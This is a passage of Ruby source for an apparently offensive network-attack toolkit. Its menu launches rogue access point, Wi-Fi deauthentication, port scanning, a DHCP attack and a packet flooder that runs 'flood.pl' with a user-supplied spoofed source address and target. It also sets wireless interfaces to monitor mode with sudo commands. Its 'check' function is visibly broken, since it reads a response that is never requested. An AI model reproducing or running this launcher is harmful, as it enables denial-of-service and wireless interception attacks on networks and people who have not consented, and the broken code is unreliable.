    puts '                                           ['.colorize(:red)+'1'.colorize(:blue)+']'.colorize(:red)+' Rouge AP '.colorize(:red)
    puts '                                           ['.colorize(:red)+'2'.colorize(:blue)+']'.colorize(:red)+' Deauth '.colorize(:red)
    puts '                                           ['.colorize(:red)+'3'.colorize(:blue)+']'.colorize(:red)+' Port Scanner '.colorize(:red)
    puts '                                           ['.colorize(:red)+'A'.colorize(:blue)+']'.colorize(:red)+' Web Port Scan '.colorize(:red)
    puts '                                           ['.colorize(:red)+'4'.colorize(:blue)+']'.colorize(:red)+' Flooder '.colorize(:red)
    puts '                                           ['.colorize(:red)+'5'.colorize(:blue)+']'.colorize(:red)+' DHCMP ATK '.colorize(:red)
    puts '                                           ['.colorize(:red)+'6'.colorize(:blue)+']'.colorize(:red)+' Check Connection '.colorize(:red)
    puts '                                           ['.colorize(:red)+'7'.colorize(:blue)+']'.colorize(:red)+' WHOIS Domain '.colorize(:red)
    puts '                                           ['.colorize(:red)+'8'.colorize(:blue)+']'.colorize(:red)+' More '.colorize(:red)
    puts '                                           ['.colorize(:red)+'9'.colorize(:blue)+']'.colorize(:red)+' Start Interface '.colorize(:red)
    puts '                                           ['.colorize(:red)+'01'.colorize(:blue)+']'.colorize(:red)+' Start Interface [Iw dev for fake AP]'.colorize(:red)
    puts '                                           ['.colorize(:red)+'02'.colorize(:blue)+']'.colorize(:red)+' Stop Interface [iw dev managed mode]'.colorize(:red)
    puts '                                           ['.colorize(:red)+'0'.colorize(:blue)+']'.colorize(:red)+' Exit '.colorize(:red)
    print "                                      >>> ".colorize(:red)
    input = gets.chomp
    if input == '02'
        system("iw dev")
        system("ifconfig")
        system("sudo iw dev mon0 del")
        system("sudo iw phy phy0 interface add wlan0 type managed")
        system("iw dev")
        print"\x1b[H\x1b[2J\x1b[3J"
        main()
        menu()
    end
    if input == '01'
        type = "monitor"
        #sudo iw phy phy0 interface add mon0 type monitor
        ic = "mon0"        
        puts "[+] Using interface #{ic}"
        system("iw dev")
        puts "[+] Running...."
        system("iw phy phy0 info")
        puts "Adding #{ic}...."
        system("sudo iw phy phy0 interface add #{ic} type #{type}")
        system("iw dev")
        puts "[-] Deleting Wlan0mon or wlan0 interface....."
        system("sudo iw dev wlan0 del")
        puts "Activating #{ic} in monitor mode "
        system("sudo ifconfig mon0 up")
        puts "Setting Freq...."
        system("sudo iw dev mon0 set freq 2437")
        print"\x1b[H\x1b[2J\x1b[3J"
        main()
        menu()
    end
    if input == '9'
        print " [!] Interface to activate >>> "
        inte1 = gets.chomp
        system("sudo airmon-ng start #{inte1}")
        clear()
        main()
        menu()
    end
    if input == '8'
        print"\x1b[H\x1b[2J\x1b[3J"
        extra()
    end
    if input == '7'
        puts '[-] Running...'.colorize(:red)
        whois()
    end
    if input == '6'
        puts 'Testing.....'
        system("cd injection ; perl test.pl")
    end
    if input == '1' # case input acting up use == instead 
        sleep 2
        puts '[+] Loading....'
        rouge() # rouge acess point 
    end
    if input == '2'
        puts '[+] Loading....'
        sleep 1 
        deauth() # deauthentication 
    end
    if input == '3'
        puts '[+] Loading....'
        hostscan()
    end
    if input == '4'
        puts '[+] Loading.....'.colorize(:red)
        puts '------------------'.colorize(:red)
        puts 'Warning! this perl script can send up to'.colorize(:red)
        puts '90000 requests and packets a second '.colorize(:red)
        puts 'use at your own risk!!!'.colorize(:red)
        puts '-------------------'.colorize(:red)
        print("Spoofed Source ~~> ")
        spoof = gets.chomp
        puts '-----------------------'.colorize(:red)
        print("Target Addr    ~~> " )
        target = gets.chomp
        system("cd injection ; sudo perl flood.pl #{spoof} #{target}")
    end
    if input == '5'
        puts '[+] Loading.....'
        system("sudo python3 DHCMP.py")
    end
    if input == '0'
        puts '[-] Exiting'
        sleep 1 
        puts 'Goodbye!'
    end
    if input == 'A'
        puts 'Starting option....'
        sleep 1 
        webscan()
    end
end


def check
    main()
    print(" Interface => ")
    interface = gets.chomp
    command = "sudo airmon-ng start #{interface}" 
    puts '[+] Putting MON0 Interface UP '
    sleep 1 
    puts "[+] Using Command -> #{command}"
    puts "[+] Adding Mon0 "
    sleep 1 
    system("iw phy phy1 interface add mon0")
    system("ifconfig mon0 up")
    system("sudo airmon-ng start #{interface} ")
    puts '[+] Checking Connections'
    url = 'https://www.google.com'
    puts "[+] Received #{resur.code} - #{resur.msg}"
    if resur.code == '404'
        puts "[-] Domain not found, aborting....."
        exit!
    end
end
main()
menu()
